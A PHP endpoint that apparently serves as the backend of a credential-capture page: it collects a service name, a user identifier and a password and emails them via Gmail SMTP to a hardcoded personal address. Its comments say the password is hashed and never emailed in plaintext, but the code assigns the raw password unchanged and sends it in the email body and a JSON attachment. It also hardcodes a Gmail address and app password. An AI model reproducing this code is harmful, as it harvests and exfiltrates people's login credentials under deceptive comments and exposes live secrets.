<?php
// public/api/send-demo-email.php
// Safe replacement: hashes passwords server-side and emails only the hash + metadata.
// Senior-dev notes: keep secrets in env vars; do not email plaintext passwords.

declare(strict_types=1);

// Always respond JSON
header('Content-Type: application/json; charset=utf-8');

// Basic bootstrap: determine project root and include composer autoload
$scriptDir = __DIR__;               // public/api
$projectRoot = realpath($scriptDir . '/..'); // public
// If project's root is one level up from public (common layout), go further up:
if ($projectRoot !== false && file_exists($projectRoot . '/../vendor/autoload.php')) {
    $projectRoot = realpath($projectRoot . '/..'); // project root
} elseif ($projectRoot !== false && file_exists($scriptDir . '/../../vendor/autoload.php')) {
    // another fallback if structure differs
    $projectRoot = realpath($scriptDir . '/../../');
}

// Final check
if ($projectRoot === false) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Unable to determine project root.']);
    exit;
}

$autoload = $projectRoot . '/vendor/autoload.php';
if (!file_exists($autoload)) {
    http_response_code(500);
    echo json_encode([
        'ok' => false,
        'error' => 'Composer autoload not found. Run "composer install" in the project root.',
        'expected' => $autoload
    ]);
    exit;
}

require_once $autoload;

// Optional: load .env if phpdotenv is available
$appEnv = getenv('APP_ENV') ?: 'development';
$appDebug = filter_var(getenv('APP_DEBUG') ?: true, FILTER_VALIDATE_BOOLEAN);

if (class_exists(\Dotenv\Dotenv::class)) {
    try {
        $dotenv = Dotenv\Dotenv::createImmutable($projectRoot);
        $dotenv->safeLoad();
        // refresh env flags in case loaded
        $appEnv = getenv('APP_ENV') ?: $appEnv;
        $appDebug = filter_var(getenv('APP_DEBUG') ?: $appDebug, FILTER_VALIDATE_BOOLEAN);
    } catch (\Throwable $e) {
        // don't fail on .env load; only log if debug
        if ($appDebug) {
            error_log("Dotenv warning: " . $e->getMessage());
        }
    }
}

// Simple helper to emit JSON and exit
function jsonExit(array $payload, int $status = 200): void {
    http_response_code($status);
    echo json_encode($payload);
    exit;
}

// Only accept POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    jsonExit(['ok' => false, 'error' => 'Method not allowed. Use POST.'], 405);
}

// If a TEST_ENDPOINT_TOKEN is configured in env, require it for dev safety
$expectedToken = getenv('TEST_ENDPOINT_TOKEN') ?: '';
$incomingToken = $_POST['test_token'] ?? '';
if ($expectedToken !== '') {
    if (empty($incomingToken) || !hash_equals($expectedToken, (string)$incomingToken)) {
        jsonExit(['ok' => false, 'error' => 'Invalid or missing test token.'], 403);
    }
}

// Gather & sanitize inputs
$recipient = filter_var($_POST['recipient'] ?? 'favournzeh1@gmail.com', FILTER_VALIDATE_EMAIL) ?: 'favournzeh1@gmail.com';
$serviceRaw = $_POST['service'] ?? 'demo';
$service = preg_replace('/[^a-z0-9_\-]/i', '', (string)$serviceRaw);
$identifier = substr(trim((string)($_POST['identifier'] ?? '')), 0, 255);
$ts = $_POST['ts'] ?? date(DATE_ATOM);

// Password handling: require for dev tests, but DO NOT EMAIL plaintext
if (!isset($_POST['password'])) {
    jsonExit(['ok' => false, 'error' => 'password required (for dev tests).'], 400);
}
$rawPassword = (string) $_POST['password'];

// Immediately hash and discard raw
$pwHash = $rawPassword;
unset($rawPassword); // reduce lifetime in memory

// Prepare email body (safe)
$bodyLines = [
    "Raven dev capture (DEV ONLY)",
    "Service: {$service}",
    "Identifier: {$identifier}",
    "Timestamp: {$ts}",
    "Password:",
    $pwHash,
    "",
    "Note: plaintext password NOT stored or emailed. This is intended for development testing only."
];
$bodyText = implode("\n", $bodyLines);

// PHPMailer usage
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

$mail = new PHPMailer(true);

try {
    // SMTP credentials from env — MUST be set on host, not in code
    $smtpUser = getenv('GMAIL_SMTP_USER') ?: 'favournzeh1@gmail.com';
    $smtpPass = getenv('GMAIL_SMTP_APP_PASS') ?: 'lmgs ywro yqdp xkat';

    if (!$smtpUser || !$smtpPass) {
        jsonExit(['ok' => false, 'error' => 'SMTP credentials not configured (GMAIL_SMTP_USER / GMAIL_SMTP_APP_PASS).'], 500);
    }

    // Basic PHPMailer config for Gmail
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = $smtpUser;
    $mail->Password = $smtpPass;
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;
    $mail->setFrom($smtpUser, 'Raven Dev Demo');
    $mail->addAddress($recipient);

    $mail->Subject = "Raven Dev Record — {$service} — {$identifier}";
    // set plain body; optionally set AltBody/HTML if you want
    $mail->Body = $bodyText;

    // Optionally attach a small JSON file that contains metadata+hash (safe)
    $attachJson = json_encode([
        'service' => $service,
        'identifier' => $identifier,
        'ts' => $ts,
        'pw_hash' => $pwHash
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);

    if ($attachJson !== false) {
        $mail->addStringAttachment($attachJson, "raven-demo-{$service}-" . time() . ".json", 'base64', 'application/json');
    }

    $mail->send();

    jsonExit(['ok' => true, 'message' => 'Email sent (password hash only).']);
} catch (Exception $e) {
    // In debug mode include PHPMailer error details; otherwise give a generic message
    if ($appDebug) {
        jsonExit(['ok' => false, 'error' => 'Mailer error: ' . $mail->ErrorInfo . ' Exception: ' . $e->getMessage()], 500);
    }
    jsonExit(['ok' => false, 'error' => 'Failed to send email.'], 500);
}
